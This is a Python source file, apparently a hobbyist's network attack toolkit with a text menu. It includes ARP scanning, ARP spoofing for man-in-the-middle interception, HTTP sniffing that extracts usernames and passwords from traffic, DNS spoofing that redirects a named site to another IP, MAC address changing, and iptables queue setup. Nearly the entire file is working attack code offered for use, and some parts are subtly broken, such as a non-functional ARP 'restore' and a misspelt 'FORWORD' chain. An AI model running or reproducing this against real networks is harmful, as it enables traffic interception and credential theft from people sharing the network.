import scapy.all as scapy
import netfilterqueue

from time import sleep
from scapy.layers import http
from subprocess import call


#  logica

class Pirate_pet:
    def mac_chenger(interface, new_mac):
        # TODO del temp if
        if interface == '':
            interface = 'eth0'
        if new_mac == '':
            new_mac = '00:11:22:33:44:55'

        call(['ifconfig', interface, 'hw', 'ether', new_mac])

    def scan(ip):
        # TODO del temp if
        if ip == '':
            my_ip = scapy.ARP().psrc
            ip = f'{ my_ip[:-1] }1/24'

        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request = scapy.ARP(pdst=ip)
        arp_broadcast_request = broadcast/arp_request
        
        answered_list = scapy.srp(
            arp_broadcast_request,
            timeout=1,
            verbose=False
        )[0]
        client_list = [{'ip': el[1].psrc, 'mac': el[1].hwsrc} for el in answered_list]

        return client_list


    def arp_spoof(target_ip, spoof_ip, flag=False):
        target_mac = Pirate_pet.scan(target_ip)[0]['mac']
        
        if not flag:
            my_mac = scapy.ARP().hwsrc
            spoof_mac = my_mac
        elif flag:
            spoof_mac = Pirate_pet.scan(spoof_ip)[0]['mac']

        packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=spoof_mac
        )

        scapy.send(packet, verbose=False)
        

    def ip_forward(flag):
        new_ip_forward = f'net.ipv4.ip_forward={flag}'
        call(['sysctl', '-w', new_ip_forward])
        

    def sniff(interface):
        def get_url(packet):
            return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

        def get_login(packet):
            if packet.haslayer(scapy.Raw):
                load = str(packet[scapy.Raw])
                keywords = ['user', 'username', 'login', 'pass', 'password']

                for keyword in keywords:
                    if keyword in load:
                        return load


        def process_sniffed_packet(packet):
            if packet.haslayer(http.HTTPRequest):
                url = get_url(packet)
                load = get_login(packet)

                return f'[+] HTTP Request {url}\n[+] login/pass {load}\n'

        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

    def dns_spoof(target_site, new_target_site):
        def process_packet(packet):
            scapy_packet = scapy.IP(packet.get_payload())
            if scapy_packet.haslayer(scapy.DNSRR):
                qname = scapy_packet[scapy.DNSQR].qname
                if target_site in str(qname):
                    print("[+] Spoofing target")

                    answer = scapy.DNSRR(rrname=qname, rdata=new_target_site)
                    scapy_packet[scapy.DNS].an = answer

                    scapy_packet[scapy.DNS].ancount = 1

                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    packet.set_payload(bytes(scapy_packet))

            packet.accept()


        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()


    def queue_iptables(name_queue_table, num_queue = 0):
        name_queue_table_list = ["OUTPUT", "INPUT", "FORWORD"]
        if name_queue_table in name_queue_table_list:
            call(["iptables", "-I", name_queue_table, "-j", "NFQUEUE", "--queue-num", num_queue])
        else:
            call(["iptables", "--flush"])


#   vivod

command = input('''
    1. mac_chenger
    2. scan
    3. arp_spoof
    4. ip_forward
    5. sniffer_packet
    6. dns_spoof
    7. queue_iptables

inter number command
> \
''')
print('')


if command == '1':
    interface = input('inter interface ')
    new_mac = input('inter new mac')

    Pirate_pet.mac_chenger(interface, new_mac)
    call(['ifconfig'])

elif command == '2':
    ip = input('inter ip scan network ')

    client_list = Pirate_pet.scan(ip)
    [print(el['ip'], '\t\t', el['mac']) for el in client_list]

elif command == '3':
    spoof_ip = input('inter spoof_ip ')
    target_ip = input('inter target_ip ')
    print('')
    sent_packet_cout = 0

    # TODO breack loop ctrl + q
    try:
        while True:
            Pirate_pet.arp_spoof(target_ip, spoof_ip)
            Pirate_pet.arp_spoof(spoof_ip, target_ip)
            
            sent_packet_cout += 2
            sleep(2)

            print(f'[+] Packet sent: { sent_packet_cout }', end="\r")
    except KeyboardInterrupt:
        Pirate_pet.arp_spoof(target_ip, spoof_ip, 'restore')
        Pirate_pet.arp_spoof(target_ip, spoof_ip, 'restore')

elif command == '4':
    call(['sysctl', 'net.ipv4.ip_forward'])
    
    flag = input('inter ip_forward 1 or 0 ')
    
    Pirate_pet.ip_forward(flag)

elif command == '5':
    interface_target = 'eth0'  # input('inter interface ')

    Pirate_pet.sniff(interface_target)

elif command == '6':
    target_site = input('inter target site\n>')
    new_target_site = input('inter IP new target site\n>')

    if target_site == '' or new_target_site =='':
        target_site = 'baza4.animevost.tv'
        new_target_site = '64.233.161.99'

    Pirate_pet.dns_spoof(target_site, new_target_site)


elif command == '7':
    name_queue_table = input("inter name_queue_table OUTPUT, INPUT or FORWORD\n>")
    num_queue = input("inter number_queue\n>")
    Pirate_pet.queue_iptables(name_queue_table, num_queue)









